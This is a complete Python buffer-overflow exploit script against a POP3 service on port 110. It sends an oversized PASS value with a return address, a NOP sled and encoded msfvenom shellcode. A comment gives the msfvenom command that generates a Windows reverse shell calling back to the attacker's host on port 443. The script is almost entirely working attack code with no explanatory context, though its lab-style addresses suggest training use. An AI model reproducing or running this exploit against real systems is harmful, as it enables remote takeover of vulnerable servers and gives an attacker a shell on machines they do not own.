#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
'''
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.238 LPORT=443
EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d"
-e x86/shikata_ga_nai
'''
buf=("\xbd\x55\xd8\xd9\x9d\xdb\xc2\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x0e\x03\x3e\xd6\x3b\x68\x3c\x0e\x39"
"\x93\xbc\xcf\x5e\x1d\x59\xfe\x5e\x79\x2a\x51\x6f\x09\x7e\x5e"
"\x04\x5f\x6a\xd5\x68\x48\x9d\x5e\xc6\xae\x90\x5f\x7b\x92\xb3"
"\xe3\x86\xc7\x13\xdd\x48\x1a\x52\x1a\xb4\xd7\x06\xf3\xb2\x4a"
"\xb6\x70\x8e\x56\x3d\xca\x1e\xdf\xa2\x9b\x21\xce\x75\x97\x7b"
"\xd0\x74\x74\xf0\x59\x6e\x99\x3d\x13\x05\x69\xc9\xa2\xcf\xa3"
"\x32\x08\x2e\x0c\xc1\x50\x77\xab\x3a\x27\x81\xcf\xc7\x30\x56"
"\xad\x13\xb4\x4c\x15\xd7\x6e\xa8\xa7\x34\xe8\x3b\xab\xf1\x7e"
"\x63\xa8\x04\x52\x18\xd4\x8d\x55\xce\x5c\xd5\x71\xca\x05\x8d"
"\x18\x4b\xe0\x60\x24\x8b\x4b\xdc\x80\xc0\x66\x09\xb9\x8b\xee"
"\xfe\xf0\x33\xef\x68\x82\x40\xdd\x37\x38\xce\x6d\xbf\xe6\x09"
"\x91\xea\x5f\x85\x6c\x15\xa0\x8c\xaa\x41\xf0\xa6\x1b\xea\x9b"
"\x36\xa3\x3f\x0b\x66\x0b\x90\xec\xd6\xeb\x40\x85\x3c\xe4\xbf"
"\xb5\x3f\x2e\xa8\x5c\xba\xb9\xdd\xab\xc4\xd7\x8a\xa9\xc4\x26"
"\xf0\x27\x22\x42\x16\x6e\xfd\xfb\x8f\x2b\x75\x9d\x50\xe6\xf0"
"\x9d\xdb\x05\x05\x53\x2c\x63\x15\x04\xdc\x3e\x47\x83\xe3\x94"
"\xef\x4f\x71\x73\xef\x06\x6a\x2c\xb8\x4f\x5c\x25\x2c\x62\xc7"
"\x9f\x52\x7f\x91\xd8\xd6\xa4\x62\xe6\xd7\x29\xde\xcc\xc7\xf7"
"\xdf\x48\xb3\xa7\x89\x06\x6d\x0e\x60\xe9\xc7\xd8\xdf\xa3\x8f"
"\x9d\x13\x74\xc9\xa1\x79\x02\x35\x13\xd4\x53\x4a\x9c\xb0\x53"
"\x33\xc0\x20\x9b\xee\x40\x40\x7e\x3a\xbd\xe9\x27\xaf\x7c\x74"
"\xd8\x1a\x42\x81\x5b\xae\x3b\x76\x43\xdb\x3e\x32\xc3\x30\x33"
"\x2b\xa6\x36\xe0\x4c\xe3")
buffer=2606*'A'+"\x8f\x35\x4a\x5f"+"\x90"*16+buf+'C'*(3500-2610-len(buf)-16)
try:
	print "Entering evil buffer"
	s.connect(('10.11.26.147', 110))
	data=s.recv(1024)
	s.send('USER username \r\n')
	data=s.recv(1024)
	s.send("PASS "+buffer+"\r\n")
	print "\nDone"
	s.close()
except:
	print "Connection error!"
